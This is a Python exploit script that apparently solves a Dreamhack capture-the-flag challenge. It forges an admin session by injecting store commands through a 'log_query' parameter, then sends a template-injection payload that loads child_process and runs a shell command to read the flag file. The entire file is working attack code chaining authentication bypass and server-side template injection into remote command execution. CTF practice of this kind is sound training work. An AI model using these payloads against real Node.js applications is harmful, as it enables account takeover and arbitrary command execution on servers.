import requests
from urllib.parse import unquote
import json
import re

url = "http://host3.dreamhack.games:21673/"
s = requests.Session()

# get session id
res = s.get(f'{url}/login', params={
    'userid': 'guest',
    'userpw': 'guest'
})

cookie = unquote(res.cookies['connect.sid'])
sess = cookie[cookie.index(':') + 1:].split(".")[0]

# auth bypass
payload = {
  "cookie": {
    "originalMaxAge": None,
    "expires": None,
    "httpOnly": None,
    "path": "/"
  },
  "userid": "admin"
}

res = s.get(f'{url}/setting?log_query[0]=set&log_query[1][]=sess:{sess}&log_query[1][]={json.dumps(payload)}')

if "ok" in res.text.lower():
    print("> Logged in as admin")

# ssti
cmd = "cat /flag"

res = s.get(f"{url}/option", params={
    'name': '{{=process.mainModule.require("child_process").execSync("%s").toString()}}' % cmd
})

flag = re.findall(r'(DH{.+})', res.text)[0]
print("Flag:", flag)